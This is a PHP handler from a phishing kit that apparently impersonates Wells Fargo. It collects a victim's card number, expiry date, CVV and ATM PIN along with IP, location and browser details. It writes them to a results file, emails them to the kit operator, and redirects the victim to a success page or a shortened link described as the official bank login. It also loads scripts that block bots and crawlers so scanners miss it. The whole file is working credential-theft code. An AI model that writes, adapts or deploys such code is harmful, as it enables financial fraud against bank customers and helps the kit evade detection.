<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';
@require "../Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if(isset($_POST['cc'])&&isset($_POST['cvv'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ CC -WELLS-SATAN- Card details ]----------------------------#\r\n";
	$hi.="Card number	: {$_POST['cc']}\r\n";
	$hi.="Expiration 	: {$_POST['cc_exp_month']}/{$_POST['cc_exp_year']}\r\n";
	$hi.="Security (cvv) : {$_POST['cvv']}\r\n";
	$hi.="Atm Pin	: {$_POST['atmpin']}\r\n";
	$hi.="#---------------------------[ -WELLS-SATAN- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ CC -WELLS-SATAN- Card details ]----------------------------#\r\n";

		$save=fopen("../Wells_result/Card.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#WELLS SATAN CC From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: WELLS SATAN  <wells_spox@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
    $key = substr(sha1(mt_rand()),1,25);
    
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}


?>